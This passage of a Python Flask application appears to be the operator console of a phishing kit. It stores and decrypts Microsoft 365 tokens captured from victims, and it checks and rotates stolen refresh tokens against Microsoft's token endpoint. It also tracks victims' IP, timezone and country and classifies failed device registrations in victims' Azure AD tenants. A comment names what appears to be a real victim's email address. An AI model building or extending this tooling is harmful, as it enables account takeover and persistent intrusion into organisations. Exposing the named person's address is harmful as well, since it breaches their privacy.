import os
import sys
import hmac
import json
import base64
import hashlib
import secrets
import subprocess
import threading
import time
import re
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional
from functools import wraps
from urllib.parse import urlparse

from flask import (
    Flask, request, jsonify, render_template, Response,
    session, redirect, url_for, send_from_directory,
)

try:
    from dotenv import load_dotenv
    load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / '.env', override=False)
except Exception:
    pass

# ===== ENCRYPTION KEY ALIAS SHIM =====
def _resolve_encryption_key_alias():
    for name in ('TOKEN_ENCRYPTION_KEY', 'WORM_MASTER_KEY', 'ENCRYPTION_KEY'):
        value = (os.environ.get(name) or '').strip()
        if value:
            for alias in ('TOKEN_ENCRYPTION_KEY', 'WORM_MASTER_KEY', 'ENCRYPTION_KEY'):
                os.environ.setdefault(alias, value)
            return name, value
    return None, ''

_resolved_key_name, _resolved_key_value = _resolve_encryption_key_alias()

# ===== LOGGER =====
try:
    from evildev.logger import get_logger
except Exception:
    def get_logger(name=None):
        import logging
        logging.basicConfig(level=logging.INFO)
        return logging.getLogger(name or 'app')

logger = get_logger(__name__)
if _resolved_key_name:
    logger.info(f"Encryption key resolved from {_resolved_key_name}")
else:
    logger.warning("No encryption key set; token writes will fail closed")

# ===== PER-EMAIL RE-ENROLL LOCKS =====
# Prevents two concurrent re-enroll pipelines from running for the same
# target. Without this, a double-click on Mint during a 20s enrollment
# spawns two enrollment.py processes, each of which registers a separate
# device in Azure AD — consuming two of the 50-per-user device slots on
# tenants that were otherwise healthy. Observed on morooka@nissenthai.co.th
# in production: two enrollments created 2.6s apart, both succeeded, both
# left enrollment rows in the DB.
#
# The lock is per-email so different targets can enroll in parallel. The
# guard lock serializes lock creation itself (get-or-create) so two
# concurrent callers for the same email don't race and create two locks.
_reenroll_locks: Dict[str, threading.Lock] = {}
_reenroll_locks_guard = threading.Lock()


def _reenroll_lock_for(email: str) -> threading.Lock:
    key = (email or '').strip().lower()
    with _reenroll_locks_guard:
        lock = _reenroll_locks.get(key)
        if lock is None:
            lock = threading.Lock()
            _reenroll_locks[key] = lock
        return lock


# ===== DB IMPORTS =====
try:
    from evildev.db import (
        init_db, execute_query,
        get_latest_enrollment_for_email, update_enrollment,
        get_user_by_username, get_user_by_id, update_user_password,
        ensure_default_operator_user, create_user,
    )
except Exception:
    from db import (
        init_db, execute_query,
        get_latest_enrollment_for_email, update_enrollment,
        get_user_by_username, get_user_by_id, update_user_password,
        ensure_default_operator_user, create_user,
    )

try:
    from evildev.geoip import resolve_country
except Exception:
    try:
        from geoip import resolve_country
    except Exception:
        resolve_country = None

# ===== CRYPTO =====
CryptoUtils = None
try:
    from evildev.core import CryptoUtils as _CryptoUtils
    CryptoUtils = _CryptoUtils
except Exception:
    try:
        from core import CryptoUtils as _CryptoUtils
        CryptoUtils = _CryptoUtils
    except Exception:
        class _CryptoUtilsFallback:
            @staticmethod
            def b64_decode(data: str):
                return base64.b64decode(data)
            @staticmethod
            def aes_gcm_decrypt(key, nonce, ciphertext, aad=b''):
                raise RuntimeError('CryptoUtils not available')
            @staticmethod
            def aes_gcm_encrypt(key, plaintext):
                raise RuntimeError('CryptoUtils not available')
        CryptoUtils = _CryptoUtilsFallback

# ===== PRT SNIPPET =====
sys.path.insert(0, str(Path(__file__).parent))
try:
    import prt_snippet
except Exception as e:
    logger.warning(f"prt_snippet unavailable: {e}")
    prt_snippet = None

# ===== REFRESH MANAGER (optional) =====
try:
    from evildev.token_refresh_manager import token_refresh_manager, TokenHealth
except Exception:
    try:
        from token_refresh_manager import token_refresh_manager, TokenHealth
    except Exception:
        class _NoOpManager:
            def get_token_health_report(self): return []
            def get_token(self, email): return None
            def load_token_from_db(self, email): return False
            def set_prt_regenerator(self, fn): pass
            _lock = threading.Lock()
        token_refresh_manager = _NoOpManager()
        class TokenHealth:
            HEALTHY = 'healthy'
            FRAGILE = 'fragile'
            REVOKED = 'revoked'
            DEAD = 'dead'

# ===== FLASK =====
app = Flask(__name__)

secret_key = os.environ.get('FLASK_SECRET_KEY')
if not secret_key:
    logger.warning('FLASK_SECRET_KEY not set; using random secret (dev only).')
    secret_key = os.urandom(32).hex()
app.secret_key = secret_key
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=os.environ.get('FLASK_USE_SSL', '').lower() in ('1', 'true', 'yes'),
)

STATIC_FOLDER = Path(__file__).parent / 'static'
TEMPLATE_FOLDER = Path(__file__).parent / 'templates'

# ===== TOKEN VERIFICATION (import-time refresh-grant probe) =====

_TOKEN_REFRESH_URL = 'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token'

_DEAD_TOKEN_AADSTS = frozenset({
    'AADSTS700082',
    'AADSTS700084',
    'AADSTS700081',
    'AADSTS50173',
    'AADSTS54005',
    'AADSTS70000',
    'AADSTS50057',
    'AADSTS700025',
})

_FRAGILE_TOKEN_AADSTS = frozenset({
    'AADSTS50076',
    'AADSTS50079',
    'AADSTS53003',
    'AADSTS50158',
    'AADSTS50105',
    'AADSTS65001',
    # AADSTS50078 — MFA expired. Mirrors FRAGILE_CODES in
    # token_refresh_manager.py so import-time verification and
    # runtime refresh classify the same token the same way.
    'AADSTS50078',
})

_REQUEST_ERROR_AADSTS = frozenset({
    'AADSTS70011',
    'AADSTS900144',
    'AADSTS9002313',
    'AADSTS500011',
    'AADSTS500014',
})

_DEAD_DESC_MARKERS = (
    'TOKEN HAS EXPIRED',
    'TOKEN IS REVOKED',
    'REFRESH TOKEN EXPIRED',
    'REFRESH TOKEN REVOKED',
    'MALFORMED OR INVALID',
    'INVALID GRANT',
)

_FRAGILE_DESC_MARKERS = (
    'INTERACTION_REQUIRED',
    'INTERACTION REQUIRED',
    'MFA REQUIRED',
    'MULTI-FACTOR',
    'CONDITIONAL ACCESS',
    'CONSENT REQUIRED',
)

_OIDC_SCOPES = frozenset({'openid', 'offline_access', 'profile'})


def _sanitize_verify_scope(raw_scope: str) -> str:
    if not raw_scope:
        return 'openid offline_access profile'

    parts = [p.strip() for p in raw_scope.replace(',', ' ').split() if p.strip()]
    if not parts:
        return 'openid offline_access profile'

    def _normalize_lower(s: str) -> str:
        return s.lower()

    def _resource_key(s: str) -> str:
        low = _normalize_lower(s)
        if low.endswith('/.default'):
            return low[: -len('/.default')]
        if low.endswith('.default'):
            return low[: -len('.default')]
        if '/' in low:
            return low.rsplit('/', 1)[0]
        return low

    default_resources = set()
    for p in parts:
        low = _normalize_lower(p)
        if low.endswith('/.default') or low.endswith('.default'):
            default_resources.add(_resource_key(p))

    seen = set()
    kept: List[str] = []
    for p in parts:
        low = _normalize_lower(p)
        if low in seen:
            continue
        if low not in _OIDC_SCOPES:
            resource = _resource_key(p)
            is_default = low.endswith('/.default') or low.endswith('.default')
            if not is_default and resource in default_resources:
                continue
        seen.add(low)
        kept.append(p)

    present_lower = {_normalize_lower(s) for s in kept}
    for base in ('openid', 'offline_access', 'profile'):
        if base not in present_lower:
            kept.insert(0, base)

    return ' '.join(kept)


def _verify_refresh_token(
    refresh_token: str,
    client_id: str,
    tenant: str,
    scope: str = 'openid offline_access profile',
    timeout: float = 15.0,
) -> Dict[str, Any]:
    if not refresh_token or not client_id:
        return {
            'ok': False, 'reason': 'misconfigured',
            'status_code': 0,
            'error_code': 'MISSING_CONFIG',
            'error_description': 'refresh_token or client_id is empty',
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    safe_scope = _sanitize_verify_scope(scope)

    url = _TOKEN_REFRESH_URL.format(tenant=(tenant or 'common').strip() or 'common')
    body = urllib.parse.urlencode({
        'grant_type': 'refresh_token',
        'client_id': client_id,
        'refresh_token': refresh_token,
        'scope': safe_scope,
    }).encode('utf-8')

    req = urllib.request.Request(
        url,
        data=body,
        method='POST',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'vault-import-verifier/1.1',
        },
    )

    status = 0
    raw = ''
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode('utf-8', errors='replace')
            status = resp.status
    except urllib.error.HTTPError as e:
        try:
            raw = e.read().decode('utf-8', errors='replace')
        except Exception:
            raw = ''
        status = e.code
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        return {
            'ok': False, 'reason': 'network_error',
            'status_code': 0,
            'error_code': 'NETWORK',
            'error_description': str(e),
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    try:
        data = json.loads(raw) if raw else {}
    except Exception:
        return {
            'ok': False, 'reason': 'misconfigured',
            'status_code': status,
            'error_code': 'NON_JSON',
            'error_description': (raw or '')[:300],
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    if status == 200 and data.get('access_token'):
        return {
            'ok': True, 'reason': 'valid',
            'status_code': 200,
            'error_code': None,
            'error_description': None,
            'access_token': data.get('access_token'),
            'expires_in': int(data.get('expires_in') or 3600),
            'new_refresh_token': data.get('refresh_token'),
        }

    error = str(data.get('error') or '').lower()
    desc = str(data.get('error_description') or data.get('error') or '')[:300]
    desc_upper = desc.upper()

    code_match = re.search(r'(AADSTS\d+)', desc_upper)
    aadsts_code = code_match.group(1) if code_match else None

    if aadsts_code in _REQUEST_ERROR_AADSTS:
        return {
            'ok': False, 'reason': 'misconfigured',
            'status_code': status,
            'error_code': aadsts_code,
            'error_description': desc,
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    if aadsts_code in _FRAGILE_TOKEN_AADSTS or any(m in desc_upper for m in _FRAGILE_DESC_MARKERS):
        return {
            'ok': False, 'reason': 'fragile',
            'status_code': status,
            'error_code': aadsts_code or (error.upper() if error else 'FRAGILE'),
            'error_description': desc,
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    is_dead = (
        (aadsts_code in _DEAD_TOKEN_AADSTS if aadsts_code else False)
        or (error == 'invalid_grant' and any(m in desc_upper for m in _DEAD_DESC_MARKERS))
    )

    if is_dead:
        return {
            'ok': False, 'reason': 'dead',
            'status_code': status,
            'error_code': aadsts_code or (error.upper() if error else 'DEAD'),
            'error_description': desc,
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    if status == 0 or status >= 500:
        return {
            'ok': False, 'reason': 'network_error',
            'status_code': status,
            'error_code': aadsts_code or error.upper() or 'SERVER_ERROR',
            'error_description': desc,
            'access_token': None, 'expires_in': None,
            'new_refresh_token': None,
        }

    return {
        'ok': False, 'reason': 'misconfigured',
        'status_code': status,
        'error_code': aadsts_code or (error.upper() if error else 'UNKNOWN'),
        'error_description': desc,
        'access_token': None, 'expires_in': None,
        'new_refresh_token': None,
    }


def _verify_and_maybe_rotate_bundle(bundle: Dict[str, Any]) -> Dict[str, Any]:
    original_rt = (bundle.get('refresh_token') or '').strip()
    if not original_rt:
        return {
            'allowed': True,
            'reason': 'no_refresh_token',
            'verification': {},
            'new_refresh_token': '',
            'note': 'bundle has no refresh token; skipped verification',
        }

    client_id = (bundle.get('client_id') or os.environ.get('CLIENT_ID') or '').strip()
    tenant = (
        (bundle.get('tenant') or '').strip()
        or ((bundle.get('user_info') or {}).get('tenantId') or '').strip()
        or (os.environ.get('TENANT') or '').strip()
        or 'common'
    )
    scope = (bundle.get('scope') or '').strip() or 'openid offline_access profile'

    result = _verify_refresh_token(
        refresh_token=original_rt,
        client_id=client_id,
        tenant=tenant,
        scope=scope,
    )

    if result['ok']:
        rotated = (result.get('new_refresh_token') or '').strip()
        if rotated and rotated != original_rt:
            bundle['refresh_token'] = rotated
            return {
                'allowed': True,
                'reason': 'rotated',
                'verification': result,
                'new_refresh_token': rotated,
                'note': f'refresh token verified and rotated (tenant={tenant})',
            }
        return {
            'allowed': True,
            'reason': 'valid',
            'verification': result,
            'new_refresh_token': original_rt,
            'note': f'refresh token verified (tenant={tenant})',
        }

    if result['reason'] == 'fragile':
        return {
            'allowed': True,
            'reason': 'fragile',
            'verification': result,
            'new_refresh_token': original_rt,
            'note': (
                f'refresh token requires interaction: '
                f"{result.get('error_code') or '?'} — "
                f"{result.get('error_description') or 'no description'}"
            ),
        }

    if result['reason'] == 'network_error':
        return {
            'allowed': True,
            'reason': 'unverified_network',
            'verification': result,
            'new_refresh_token': original_rt,
            'note': (
                f'could not reach Microsoft to verify token: '
                f"{result.get('error_description') or 'network error'}"
            ),
        }

    if result['reason'] == 'misconfigured':
        return {
            'allowed': True,
            'reason': 'unverified_misconfigured',
            'verification': result,
            'new_refresh_token': original_rt,
            'note': (
                f'verification skipped (misconfigured): '
                f"{result.get('error_description') or 'unknown reason'}"
            ),
        }

    return {
        'allowed': False,
        'reason': 'dead',
        'verification': result,
        'new_refresh_token': original_rt,
        'note': (
            f"refresh token is dead: "
            f"{result.get('error_code') or '?'} — "
            f"{result.get('error_description') or 'no description'}"
        ),
    }


if not (os.environ.get('CLIENT_ID') or '').strip():
    logger.warning(
        "CLIENT_ID is not set — token verification during import will be skipped "
        "(imports will be stored as 'unverified'). Set CLIENT_ID in .env."
    )
if not (os.environ.get('TENANT') or '').strip():
    logger.warning(
        "TENANT is not set — token verification during import will use 'common' "
        "as a fallback. Set TENANT in .env for accurate verification."
    )

# ===== AUTH =====
_raw = os.environ.get('REQUIRE_AUTH')
REQUIRE_AUTH = (_raw or 'true').strip().lower() in ('1', 'true', 'yes', 'on')

OPERATOR_KEYS = {
    k for k in (
        os.environ.get('AUTH_KEY'),
        os.environ.get('API_KEY'),
        os.environ.get('PHISH_PORTAL_KEY'),
    ) if k
}


def _extract_key():
    auth = request.headers.get('Authorization', '')
    if auth.startswith('Bearer '):
        return auth[7:]
    if auth.lower().startswith('basic '):
        try:
            decoded = base64.b64decode(auth[6:]).decode('utf-8')
            username, sep, password = decoded.partition(':')
            if sep and check_auth(username, password):
                return f'basic:{username}'
        except Exception:
            pass
    return request.headers.get('X-API-Key') or ''


def _operator_key_ok(supplied):
    if not REQUIRE_AUTH:
        return True
    if not supplied:
        return False
    if supplied.startswith('basic:'):
        return True
    if not OPERATOR_KEYS:
        return False
    return any(hmac.compare_digest(supplied, k) for k in OPERATOR_KEYS)


def is_auth_enabled() -> bool:
    return REQUIRE_AUTH


def check_auth(username: str, password: str) -> bool:
    if not is_auth_enabled():
        return True
    if get_user_by_username is not None:
        try:
            ensure_default_operator_user()
            user = get_user_by_username(username)
            if user:
                if not user.get('password_hash'):
                    return False
                candidate_hash = hashlib.pbkdf2_hmac(
                    'sha256',
                    str(password).encode('utf-8'),
                    str(os.environ.get('USER_PASSWORD_SALT', 'fishing-default-salt')).encode('utf-8'),
                    200000,
                ).hex()
                return hmac.compare_digest(candidate_hash, str(user['password_hash']))
        except Exception:
            pass
    expected_user = os.environ.get('AUTH_USER', 'admin')
    expected_pass = os.environ.get('AUTH_PASS', 'password')
    return (
        hmac.compare_digest(str(username), str(expected_user))
        and hmac.compare_digest(str(password), str(expected_pass))
    )


def is_authenticated() -> bool:
    if not is_auth_enabled():
        return True
    return bool(session.get('logged_in')) or session.get('user_id') is not None


def requires_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if request.method == 'OPTIONS':
            return f(*args, **kwargs)
        if not REQUIRE_AUTH:
            return f(*args, **kwargs)
        try:
            if session.get('logged_in') or session.get('user_id') is not None:
                return f(*args, **kwargs)
        except Exception:
            pass
        try:
            auth = request.authorization
            if auth and check_auth(auth.username, auth.password):
                return f(*args, **kwargs)
        except Exception:
            pass
        if not _operator_key_ok(_extract_key()):
            return jsonify({'error': 'unauthorized'}), 401
        return f(*args, **kwargs)
    return wrapper


def _current_user_id() -> int:
    try:
        uid = session.get('user_id')
        return int(uid) if uid is not None else 0
    except Exception:
        return 0


def _current_user_role() -> str:
    return str(session.get('user_role') or 'admin')


def _user_scope_filter(table_alias: str = 't'):
    user_id = _current_user_id()
    if user_id <= 0:
        return '', []
    return (
        f" AND ({table_alias}.owner_id IS NULL OR {table_alias}.owner_id = 0 OR {table_alias}.owner_id = ?)",
        [user_id],
    )


def is_relative_path(target: str) -> bool:
    try:
        if not target:
            return False
        parsed = urlparse(str(target))
        if parsed.scheme or parsed.netloc:
            return False
        return parsed.path.startswith('/')
    except Exception:
        return False


# ===== JWT / DT / DECRYPT HELPERS =====
def decode_jwt(token: str) -> dict:
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {}
        payload = parts[1]
        payload += '=' * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def _normalize_utc_datetime(value: Any) -> Optional[datetime]:
    if value is None:
        return None
    if isinstance(value, datetime):
        dt = value
    elif isinstance(value, str):
        try:
            dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        except Exception:
            return None
    else:
        return None
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    else:
        dt = dt.astimezone(timezone.utc)
    return dt


def _decrypt_token_payload(encrypted_token: Optional[str]) -> Optional[dict]:
    if not encrypted_token:
        return None
    key_hex = (
        os.environ.get('TOKEN_ENCRYPTION_KEY')
        or os.environ.get('WORM_MASTER_KEY')
        or ''
    ).strip()
    try:
        master_key = bytes.fromhex(key_hex[:64])
        if len(master_key) != 32:
            return None
        raw = (
            CryptoUtils.b64_decode(encrypted_token)
            if hasattr(CryptoUtils, 'b64_decode')
            else base64.b64decode(encrypted_token)
        )
        plaintext = CryptoUtils.aes_gcm_decrypt(master_key, raw[:12], raw[12:])
        parsed = json.loads(plaintext.decode('utf-8'))
        return parsed if isinstance(parsed, dict) else None
    except Exception:
        return None


def _classify_vault_status(has_token: bool, has_refresh: bool, expires_at: Optional[str]) -> str:
    if not has_token:
        return 'no_token'
    expires_dt = _normalize_utc_datetime(expires_at)
    if expires_dt is None:
        # No recorded expiry: assume best case if we have a refresh token
        # (manager can mint), and expired otherwise (nothing to recover from).
        return 'recoverable' if has_refresh else 'expired'
    if expires_dt > datetime.now(timezone.utc):
        return 'active'
    return 'recoverable' if has_refresh else 'expired'


# ── DRS failure classification ────────────────────────────────────────
# Mirrors the marker set in drs_re_enroll's pre-flight check. Keep these
# in sync: a kind returned here must match a marker there, or the UI will
# show a classifiable failure that the pre-flight still lets through.

_DRS_FAILURE_MARKERS = (
    # (kind, marker-substrings, user-facing hint)
    ('device_cap',  ('devicecapreached', 'device cap'),
     'Tenant device cap reached. Free a slot in Azure AD, or skip this target.'),
    ('policy',      ('administrator policy', 'does not allow this user'),
     'Tenant admin policy blocks device join for this account. Ask a tenant '
     'admin to allow device join, or skip.'),
    ('assignment',  ('aadsts50105',),
     'User is not assigned to the device registration service.'),
    ('consent',     ('aadsts65001',),
     'Admin consent is required for the DRS scope.'),
    ('app_missing', ('aadsts700016',),
     'DRS application is not present in this tenant.'),
    ('schema',      ('schema/',),
     'DRS rejected the enrollment envelope. See raw error for the field.'),
    ('token',       ('auth:', 'adrs_access', 'mail-scoped'),
     'Stored token lacks scp=adrs_access. Re-capture with DRS scope.'),
    ('no_token',    ('no_token:',),
     'No usable refresh token. Re-capture the account.'),
)


def _classify_drs_failure(error_text: Optional[str]) -> tuple:
    """Return (kind, hint) for a targets.drs_enrolled_error value.

    kind is one of: policy, device_cap, assignment, consent, app_missing,
    schema, token, no_token, unknown. Empty/None → (None, None).
    """
    if not error_text:
        return None, None
    e = str(error_text).lower()
    for kind, markers, hint in _DRS_FAILURE_MARKERS:
        if any(m in e for m in markers):
            return kind, hint
    return 'unknown', None


def _drs_state_for(row_at: Optional[str], row_err: Optional[str]) -> str:
    """Return 'enrolled' | 'failed' | 'never'."""
    at = str(row_at or '')
    if at.startswith('FAILED:'):
        return 'failed'
    if at.strip():
        return 'enrolled'
    if row_err and str(row_err).strip():
        return 'failed'
    return 'never'


def _row_is_enrolled(email: str) -> bool:
    if not email:
        return False
    try:
        row = execute_query(
            "SELECT 1 FROM enrollments WHERE LOWER(email) = LOWER(?) LIMIT 1",
            params=(email,), fetch_one=True,
        )
        return bool(row)
    except Exception:
        return False


def _extract_display_name_from_decrypted(decrypted: Optional[dict]) -> Optional[str]:
    if not isinstance(decrypted, dict):
        return None
    user_info = decrypted.get('user_info') or {}
    if isinstance(user_info, dict):
        for key in ('displayName', 'display_name', 'name'):
            v = user_info.get(key)
            if v:
                return str(v)
    id_token = decrypted.get('id_token')
    if isinstance(id_token, str) and id_token:
        claims = decode_jwt(id_token) or {}
        for key in ('name', 'display_name', 'preferred_username'):
            v = claims.get(key)
            if v:
                return str(v)
    return None


def _extract_country_from_jwt_bundle(bundle: Optional[dict]) -> Dict[str, Any]:
    """Return target country fields derived from the bundle's JWT claims."""
    if not isinstance(bundle, dict):
        return {
            'country_code': None,
            'country_source': None,
            'country_signals': None,
            'victim_ip': None,
            'victim_timezone': None,
            'victim_locale': None,
        }

    jwt_claims = bundle.get('jwt_claims') if isinstance(bundle.get('jwt_claims'), dict) else {}
    access_claims = jwt_claims.get('access_token') if isinstance(jwt_claims.get('access_token'), dict) else {}
    id_claims = jwt_claims.get('id_token') if isinstance(jwt_claims.get('id_token'), dict) else {}
    if not access_claims:
        access_claims = decode_jwt(bundle.get('access_token') or '') or {}
    if not id_claims:
        id_claims = decode_jwt(bundle.get('id_token') or '') or {}

    user_info = bundle.get('user_info') if isinstance(bundle.get('user_info'), dict) else {}
    ip = (
        access_claims.get('ipaddr')
        or access_claims.get('ip_address')
        or id_claims.get('ipaddr')
        or id_claims.get('ip_address')
        or user_info.get('ipaddr')
        or user_info.get('ip_address')
        or bundle.get('victim_ip')
        or bundle.get('ipaddr')
        or bundle.get('ip_address')
    )
    timezone_name = (
        access_claims.get('timezone')
        or id_claims.get('timezone')
        or user_info.get('timezone')
        or bundle.get('victim_timezone')
    )
    locale = (
        access_claims.get('locale')
        or id_claims.get('locale')
        or user_info.get('locale')
        or bundle.get('victim_locale')
    )
    tenant_region_scope = (
        access_claims.get('tenant_region_scope')
        or id_claims.get('tenant_region_scope')
        or user_info.get('tenant_region_scope')
        or bundle.get('tenant_region_scope')
    )

    resolved = resolve_country(
        ip=str(ip).strip() if ip else None,
        email=(bundle.get('email') or '').strip(),
        tenant_region_scope=str(tenant_region_scope).strip() if tenant_region_scope else None,
        timezone=str(timezone_name).strip() if timezone_name else None,
        server_ip=None,
        locale=str(locale).strip() if locale else None,
    ) if resolve_country else {}
    signals = resolved.get('signals') if isinstance(resolved, dict) else {}
    return {
        'country_code': (resolved or {}).get('code'),
        'country_source': (resolved or {}).get('source'),
        'country_signals': json.dumps(signals, separators=(',', ':'), sort_keys=True) if signals else None,
        'victim_ip': str(ip).strip() if ip else None,
        'victim_timezone': str(timezone_name).strip() if timezone_name else None,
        'victim_locale': str(locale).strip() if locale else None,
    }


# ===== LOGIN / LOGOUT / VAULT PAGE =====
login_attempts = {}


def rate_limit_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr or 'unknown'
        attempts, timestamp = login_attempts.get(ip, (0, time.time()))
        if attempts >= 5 and time.time() - timestamp < 300:
            return jsonify({'error': 'Too many login attempts'}), 429
        return f(*args, **kwargs)
    return decorated


@app.route('/login', methods=['GET', 'POST'])
@rate_limit_login
def login():
    if not is_auth_enabled():
        return redirect(url_for('index'))
    error = None
    ip = request.remote_addr or 'unknown'
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if check_auth(username, password):
            login_attempts.pop(ip, None)
            user = get_user_by_username(username) if get_user_by_username else None
            session['logged_in'] = True
            session['user_id'] = (user or {}).get('id', 0)
            session['username'] = (user or {}).get('username') or username
            session['user_role'] = (user or {}).get('role') or 'admin'
            next_url = request.args.get('next') or url_for('index')
            if not is_relative_path(next_url):
                next_url = url_for('index')
            return redirect(next_url)
        attempts, _ = login_attempts.get(ip, (0, time.time()))
        login_attempts[ip] = (attempts + 1, time.time())
        error = 'Invalid username or password.'
    return render_template('login.html', error=error)


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('user_id', None)
    session.pop('username', None)
    session.pop('user_role', None)
    session.pop('password_change_csrf', None)
    return redirect(url_for('login'))


@app.route('/')
def index():
    if not is_authenticated():
        return render_template('login.html', error=None)
    return redirect(url_for('results_vault_page'))


@app.route('/vault')
@requires_auth
def results_vault_page():
    return render_template('vault.html')


@app.route('/account/password', methods=['GET', 'POST'])
def change_password():
    user_id = _current_user_id()
    if not is_auth_enabled() or not session.get('logged_in') or user_id <= 0:
        return redirect(url_for('login'))

    user = get_user_by_id(user_id) if get_user_by_id else None
    if not user:
        return redirect(url_for('login'))

    csrf_token = session.get('password_change_csrf')
    if not csrf_token:
        csrf_token = secrets.token_urlsafe(32)
        session['password_change_csrf'] = csrf_token

    error = None
    if request.method == 'POST':
        submitted_token = request.form.get('csrf_token', '')
        if not hmac.compare_digest(str(csrf_token), str(submitted_token)):
            error = 'Your session expired. Reload this page and try again.'
        else:
            current_password = request.form.get('current_password', '')
            new_password = request.form.get('new_password', '')
            confirm_password = request.form.get('confirm_password', '')
            if not check_auth(user['username'], current_password):
                error = 'Current password is incorrect.'
            elif len(new_password) < 12:
                error = 'New password must be at least 12 characters.'
            elif len(new_password) > 1024:
                error = 'New password is too long.'
            elif new_password != confirm_password:
                error = 'New passwords do not match.'
            elif not update_user_password(user_id, new_password):
                error = 'Password could not be updated. Please try again.'
            else:
                session['password_change_csrf'] = secrets.token_urlsafe(32)
                return redirect(url_for('change_password', updated='1'))

    return render_template(
        'change_password.html',
        username=user['username'],
        csrf_token=csrf_token,
        error=error,
        updated=request.args.get('updated') == '1',
    )


@app.route('/static/<path:filename>')
@requires_auth
def serve_static(filename):
    return send_from_directory(STATIC_FOLDER, filename)


@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Not found"}), 404


@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500


# ===== VAULT LIST =====
@app.route('/api/vault/list', methods=['GET'])
@requires_auth
def api_vault_list():
    try:
        search = (request.args.get('search') or '').strip().lower()

        where_parts = [
            "t.email IS NOT NULL",
            "TRIM(t.email) <> ''",
            "LOWER(TRIM(t.email)) NOT IN ('email', 'null', 'undefined')",
            "t.email LIKE '%%@%%'",
        ]
        params: List[Any] = []

        if search:
            where_parts.append(
                '(LOWER(t.email) LIKE ? '
                "OR LOWER(COALESCE(t.source_email, '')) LIKE ? "
                "OR LOWER(COALESCE(t.job_title, '')) LIKE ? "
                "OR LOWER(COALESCE(t.display_name, '')) LIKE ?)"
            )
            needle = f'%{search}%'
            params.extend([needle, needle, needle, needle])

        where_sql = 'WHERE ' + ' AND '.join(where_parts)

        raw_order = (request.args.get('order') or 'captured_at').strip().lower()
        order_dir = 'DESC'
        allowed_orders = {
            'captured_at': 't.captured_at',
            'created_at': 't.created_at',
            'email': 't.email',
        }
        order_col = allowed_orders.get(raw_order, 't.captured_at')

        try:
            limit = min(max(int(request.args.get('limit', 50)), 1), 500)
        except (TypeError, ValueError):
            limit = 50
        try:
            offset = max(int(request.args.get('offset', 0)), 0)
        except (TypeError, ValueError):
            offset = 0

        rows = execute_query(
            f"""
            SELECT
                t.email, t.source_email, t.display_name, t.status,
                t.ca_class, t.captured_at, t.created_at, t.job_title,
                t.relationship, t.country_code, t.country_source,
                t.country_signals, t.victim_ip, t.victim_timezone,
                tok.email           AS token_email,
                tok.encrypted_token AS token_encrypted,
                tok.refresh_token   AS token_refresh_plain,
                tok.expires_at      AS token_expires_at,
                tok.captured_at     AS token_captured_at,
                t.drs_enrolled_at,
                t.drs_enrolled_error
            FROM targets t
            LEFT JOIN tokens tok ON LOWER(tok.email) = LOWER(t.email)
            {where_sql}
            ORDER BY ({order_col} IS NULL), {order_col} {order_dir}
            """,
            params=tuple(params) if params else None,
            fetch_all=True,
        ) or []

        status_arg = (request.args.get('status') or '').strip().lower()

        results: List[Dict[str, Any]] = []
        for row in rows:
            rv = list(row) + [None] * (21 - len(row))
            (
                email, source_email, display_name, status,
                ca_class, captured_at, created_at, job_title, relationship,
                country_code, country_source, country_signals,
                victim_ip, victim_timezone,
                token_email, token_encrypted, token_refresh_plain,
                token_expires_at, token_captured_at,
                drs_enrolled_at, drs_enrolled_error,
            ) = rv[:21]

            has_token = bool(token_email)
            has_refresh = bool(token_refresh_plain)
            decrypted = None
            if not has_refresh and token_encrypted:
                try:
                    decrypted = _decrypt_token_payload(token_encrypted)
                    if isinstance(decrypted, dict) and decrypted.get('refresh_token'):
                        has_refresh = True
                except Exception:
                    decrypted = None

            verified_flag = True
            if isinstance(decrypted, dict):
                if decrypted.get('_verified') is False:
                    verified_flag = False

            country_info = {
                'code': country_code,
                'source': country_source,
                'signals': {},
            }
            if country_signals:
                try:
                    country_info['signals'] = (
                        country_signals if isinstance(country_signals, dict)
                        else json.loads(country_signals)
                    )
                except Exception:
                    country_info['signals'] = {}

            if (not country_info.get('code') or not country_info.get('source')) and victim_ip and resolve_country:
                try:
                    resolved = resolve_country(
                        ip=victim_ip,
                        email=email,
                        tenant_region_scope=None,
                        timezone=victim_timezone,
                        server_ip=None,
                        locale=None,
                    )
                    if resolved and resolved.get('code'):
                        country_info = {
                            'code': resolved.get('code'),
                            'source': resolved.get('source'),
                            'signals': resolved.get('signals') or {},
                        }
                except Exception:
                    pass

            status_badge = _classify_vault_status(
                has_token=has_token,
                has_refresh=has_refresh,
                expires_at=token_expires_at,
            )

            display_name = display_name
            if decrypted is not None:
                display_name = display_name or _extract_display_name_from_decrypted(decrypted)

            expires_dt = _normalize_utc_datetime(token_expires_at)
            seconds_until_expiry: Optional[int] = None
            token_expired = False
            if expires_dt is not None:
                delta = (expires_dt - datetime.now(timezone.utc)).total_seconds()
                seconds_until_expiry = int(delta)
                token_expired = delta <= 0

